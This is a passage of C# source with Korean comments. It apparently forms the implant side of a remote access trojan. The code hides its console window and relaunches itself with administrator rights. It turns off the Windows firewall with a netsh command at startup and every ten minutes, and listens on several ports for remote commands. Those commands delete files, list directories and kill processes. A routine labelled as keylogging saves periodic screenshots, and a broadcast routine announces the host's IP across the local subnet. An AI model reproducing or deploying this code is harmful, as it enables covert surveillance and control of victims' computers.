                                    string msg = "파일이 없거나 잘못입력되었습니다."; //Received 되는 문자열
                                    byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }
                                else
                                {
                                    File.Delete(Dtemp);

                                    string msg = "삭제완료"; //Received 되는 문자열
                                    byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }
                            }
                            catch
                            {
                                string msg = "파일이 없거나 잘못입력되었습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }

                        else if (temp[0] == "DIRF$")
                        {
                            try
                            {
                                Console.WriteLine(temp[1]);
                                string STest = temp[1].ToString();
                                char[] Test = STest.ToCharArray(); //받은 값은 Char배열로 나열함

                                foreach (char ST in Test)
                                {
                                    if (ST == '*')
                                    {
                                        T = 1;
                                    }
                                }

                                if (T == 0) //에러인자가 "거짓" 일 경우 에러를 BroadCast 한 후에 return
                                {
                                    string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }

                                else if (T == 1)
                                {
                                    string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                    string DR = ""; //수정된 경로를 저장할 곳이다.

                                    for (int i = 0; i < Dirtemp.Length; i++)
                                    {
                                        DR += Dirtemp[i] + ":";
                                    }
                                    DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함


                                    Console.WriteLine("지정된 경로 : " + DR);
                                    byte[] buffer = Encoding.Unicode.GetBytes("Server : 지정된 경로 - " + DR + Environment.NewLine + "데이터를 탐색합니다.");
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);

                                    string DirInfo = "";


                                    DirectoryInfo Dtemp = new DirectoryInfo(DR);
                                    Console.WriteLine(Dtemp);
                                    DirInfo += Dtemp + Environment.NewLine;
                                    FileInfo[] files = Dtemp.GetFiles();
                                    foreach (FileInfo file2 in files) //파일 정보들을 반환함
                                    {
                                        DirInfo += Path.Combine(Dtemp.ToString() + "\\" + file2) + Environment.NewLine;
                                        Console.WriteLine(Path.Combine(Dtemp.ToString() + "\\" + file2));
                                    }

                                    byte[] Dir = Encoding.Unicode.GetBytes(DirInfo.ToString());
                                    newSocket.Send(Dir, Dir.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", Dir);
                                    Console.WriteLine();

                                    T = 0; //초기화
                                }

                            }

                            catch
                            {
                                string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }

                        }
                        else if (temp[0] == "DIRO$")
                        {
                            try
                            {
                                Console.WriteLine(temp[1]);
                                string STest = temp[1].ToString();
                                char[] Test = STest.ToCharArray(); //받은 값은 Char배열로 나열함

                                foreach (char ST in Test)
                                {
                                    if (ST == '*')
                                    {
                                        T = 1;
                                    }
                                }

                                if (T == 0) //에러인자가 "거짓" 일 경우 에러를 반환한 후에 return
                                {
                                    string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                    byte[] Error = Encoding.Unicode.GetBytes(msg);
                                    newSocket.Send(Error, Error.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", msg);
                                    Console.WriteLine();
                                }

                                else if (T == 1)
                                {
                                    string[] Dirtemp = temp[1].Split('*'); //경로의 '*'문자를 ':' 로 변경
                                    string DR = ""; //수정된 경로를 저장할 곳이다.

                                    for (int i = 0; i < Dirtemp.Length; i++)
                                    {
                                        DR += Dirtemp[i] + ":";
                                    }
                                    DR = DR.Substring(0, DR.LastIndexOf(':')); //마지막 문자열 ":" 을 삭제함

                                    Console.WriteLine("지정된 경로 : " + DR);
                                    byte[] buffer = Encoding.Unicode.GetBytes("Server : 지정된 경로 - " + DR + Environment.NewLine + "데이터를 탐색합니다.");
                                    newSocket.Send(buffer, buffer.Length, SocketFlags.None);

                                    FolderScan(Path.Combine(DR)); //함수를 새로 실행하여 값을 수동(?)으로 반환받는다
                                    string DirInfo = FolderSC; //반환값 저장

                                    byte[] Dir = Encoding.Unicode.GetBytes(DirInfo.ToString());
                                    newSocket.Send(Dir, Dir.Length, SocketFlags.None);
                                    Console.WriteLine("Send data : {0}", Dir);
                                    Console.WriteLine();

                                    T = 0; //초기화
                                    FolderSC = "";
                                }
                            }
                            catch
                            {

                                string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }
                        else if (temp[0] == "PKL$") //프로세스탐색
                        {
                            string PKL = "";
                            List<String> PKLL = new List<string>();
                            try
                            {
                                Process[] allProc = Process.GetProcesses();
                                int i = 1;
                                PKL += "****** 모든 프로세스 정보 ******" + Environment.NewLine;
                                PKL += "현재 실행중인 모든 프로세스 수 : " + allProc.Length + Environment.NewLine;
                                foreach (Process p in allProc)
                                {
                                    PKLL.Add(p.ProcessName + Environment.NewLine);
                                    //PKL += p.ProcessName + Environment.NewLine;
                                }

                                PKLL.Sort(); //알파벳 정렬

                                foreach (String s in PKLL)
                                {
                                    PKL += s;
                                }

                                string msg = PKL; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }
                        
                        else if (temp[0] == "PKL_KILL$")
                        {
                            try
                            {
                                string pk = temp[1];
                                Process[] proc = Process.GetProcessesByName(pk);
                                if (proc.Length > 0)
                                {
                                    foreach (Process pr in proc)
                                    {
                                        pr.Kill();
                                    }
                                }

                                string msg = pk + " 프로세스가 종료 되었습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                            catch
                            {
                                string msg = "종료할 프로세스가 없거나 명령을 실행할 수 없습니다."; //Received 되는 문자열
                                byte[] buffer = Encoding.Unicode.GetBytes(msg);
                                newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                                Console.WriteLine("Send data : {0}", msg);
                                Console.WriteLine();
                            }
                        }
                        else
                        {

                            string msg = "명령을 실행할 수 없습니다."; //Received 되는 문자열
                            byte[] buffer = Encoding.Unicode.GetBytes(msg);
                            newSocket.Send(buffer, buffer.Length, SocketFlags.None);
                            Console.WriteLine("Send data : {0}", msg);
                            Console.WriteLine();
                        }

                        
                    }
                    catch (SocketException se)
                    {
                        Console.WriteLine(se.Message);
                        break;
                    }

                }
            }

        } //함수끝나는 부분

        public void FIM() //방화벽 해제
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.Write(@"netsh advfirewall set allprofiles state off" + Environment.NewLine);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
        }


        public void timer2_Elapsed(object sender, ElapsedEventArgs e) //키로그캡쳐 함수시작
        {
            key++;

            if (key == 5)
            {
                File.AppendAllText(KLPath + "KL_log.txt", Environment.NewLine + DateTime.Now.ToString("MM월-dd일-HH시-mm분-ss초"));

                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);

                var gfxScreenShot = Graphics.FromImage(bmpScreenshot);
                gfxScreenShot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

                bmpScreenshot.Save("C:\\factory\\Key\\" + DateTime.Now.ToString("MM월-dd일-HH시-mm분-ss초") + ".png", ImageFormat.Png);
                bmpScreenshot.Dispose();

                key = 0;
            }

        }

        public void KLY()
        {

        }


        public void FolderScan(string name)
        {
            try
            {
                string[] dir = Directory.GetDirectories(name);
                foreach (string Dtemp in dir)
                {
                    Console.WriteLine(Dtemp);
                    //FolderScan(Dtemp);
                    FolderSC += Dtemp + Environment.NewLine;
                }
            }
            catch
            {

            }
        }

        public void DirScan(string name)
        {
            try
            {
                string[] dir = Directory.GetDirectories(name);
                foreach (string Dtemp in dir)
                {
                    Console.WriteLine(Dtemp);
                    DIRSC += Dtemp + Environment.NewLine;

                    string[] files = Directory.GetFiles(Dtemp);
                    foreach (string FTemp in files)
                    {
                        Console.WriteLine(FTemp);
                        DIRSC += FTemp + Environment.NewLine;
                    }

                    DirScan(Dtemp);
                }
            }

            catch
            {

            }
        }
    }

    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public int T = 0;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);


            /* 실행 시 관리자 권한 상승을 위한 코드 시작 */
            if (/* Main 아래에 정의된 함수 */IsAdministrator() == false)
            {
                try
                {
                    ProcessStartInfo procInfo = new ProcessStartInfo();
                    procInfo.UseShellExecute = true;
                    procInfo.FileName = Application.ExecutablePath;
                    procInfo.WorkingDirectory = Environment.CurrentDirectory;
                    procInfo.Verb = "runas";
                    Process.Start(procInfo);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message.ToString());
                }

                
                return;
            }

            new Program().Start();  
        }

        /* 실행 시 관리자 권한 상승을 위한 함수 시작 */
        public static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();

            if (null != identity)
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }


            return false;
        }
        /* 실행 시 관리자 권한 상승을 위한 함수 끝 */

        public void Start()
        {
            Thread t1 = new Thread(new ThreadStart(timer1Start)); //자신의 IP정보를 모든 대역으로 보낸다. //보내는 모든 대역은 가장기본인 192.168.0.xxx 다 상황에따라 바꿔사용한다.
            //방화벽 해제 기능으로 대체됨
            t1.Start(); //IP브로드캐스팅 기능 지금은 사용하지 않음 

            IPEndPoint ipEndPoint1 = new IPEndPoint(IPAddress.Any, 8080);
            IPEndPoint ipEndPoint2 = new IPEndPoint(IPAddress.Any, 8081);
            IPEndPoint ipEndPoint3 = new IPEndPoint(IPAddress.Any, 8087);

            IPEndPoint[] ipEndPoint = new IPEndPoint[3] { ipEndPoint1, ipEndPoint2, ipEndPoint3 };
            //IPEndPoint[] ipEndPoint = new IPEndPoint[1] { ipEndPoint1 };

            ListenPorts listenport = new ListenPorts(ipEndPoint);
            listenport.beginListen();

            FIM();
            Console.WriteLine("방화벽 해제 성공");

            Console.WriteLine("Begin Listen");
            Console.WriteLine();

            Console.ReadKey();
        }

        void timer1Start()
        {
            System.Timers.Timer timer1 = new System.Timers.Timer();
            timer1.Interval = 1000;
            timer1.Elapsed += new ElapsedEventHandler(timer1_Elapsed);
            timer1.Start();
        }

        void timer1_Elapsed(object sender, ElapsedEventArgs e)
        {
            T++;
            if (T == 600)
            {
                //BroadCast();
                FIM();
                T = 0;
            }
        }

        public void FIM()
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.Write(@"netsh advfirewall set allprofiles state off" + Environment.NewLine);
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
        }

        public static byte[] packetData;

        public void BroadCast()
        {
            string MyIP = "";
            IPEndPoint[] Pumping = new IPEndPoint[254];
            
            for (int i = 0; i < 254; i++)
            {
                Pumping[i] = new IPEndPoint(IPAddress.Parse("192.168.0."+(i+1)), 12345); //보내는 모든 대역은 가장기본인 192.168.0.xxx 다 상황에따라 바꿔사용한다.
            }

            IPHostEntry host = Dns.GetHostByName(Dns.GetHostName());
            MyIP = host.AddressList[0].ToString();
            packetData = ASCIIEncoding.ASCII.GetBytes("["+MyIP.ToString()+"]");
            
            Socket FastSend = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

            try
            {
                foreach(IPEndPoint ep in Pumping)
                {
                    //Console.WriteLine(ep.ToString());
                    FastSend.SendTo(packetData, ep);
                    Console.WriteLine("["+MyIP+"] 를"+ ep.ToString() + "에 전송완료");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }


    class test1
    {
        public List<Int32> a
        {
            get;
            set;
        }
    }
}
